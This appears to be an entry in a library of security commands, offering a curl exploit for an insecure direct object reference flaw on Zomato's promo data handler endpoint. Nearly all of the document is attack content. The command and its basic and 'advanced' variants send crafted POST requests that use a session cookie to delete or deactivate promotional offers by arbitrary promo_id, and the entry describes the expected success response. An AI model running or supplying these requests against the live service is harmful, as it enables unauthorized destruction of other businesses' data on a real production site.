---
id: 123e4567-e89b-12d3-a456-426614174002
name: curl-idor-promo-delete
type: command
executor: bash
data: >-
  curl -X POST -H "Cookie: session=your_session_cookie" -d
  "action=delete&promo_id=TARGET_PROMO_ID"
  https://www.zomato.com/clients/promoDataHandler.php
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.132Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web
  - exploit
  - idor
verified: false
validated: true
submitted: true
---

# curl-idor-promo-delete

## Command

```bash
curl -X POST -H "Cookie: session=your_session_cookie" -d "action=delete&promo_id=TARGET_PROMO_ID" https://www.zomato.com/clients/promoDataHandler.php
```

## Description

This command exploits an IDOR vulnerability by sending a crafted POST request to Zomato's promo handler endpoint to delete a promotional offer using an unauthorized promo_id. Use it in authenticated sessions to test access control bypasses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Cookie: session=..."` | Authenticates the request with session cookie | Yes |
| `-d "action=delete&promo_id=..."` | Payload with action and target promo_id | Yes |
| `https://www.zomato.com/clients/promoDataHandler.php` | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Cookie: session=abc123" -d "action=delete&promo_id=999" https://www.zomato.com/clients/promoDataHandler.php
```

### Advanced Usage

```bash
curl -X POST -H "Cookie: session=abc123" -H "Content-Type: application/x-www-form-urlencoded" -d "action=deactivate&promo_id=999&confirm=true" https://www.zomato.com/clients/promoDataHandler.php -v
```

## Expected Output

Successful execution returns a JSON response like {"status":"success", "message":"Promo deleted"}. Failure due to invalid ID might return {"error":"Invalid promo"}. Use -v flag for verbose HTTP details.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-to-Delete-Promotional-Offers]]
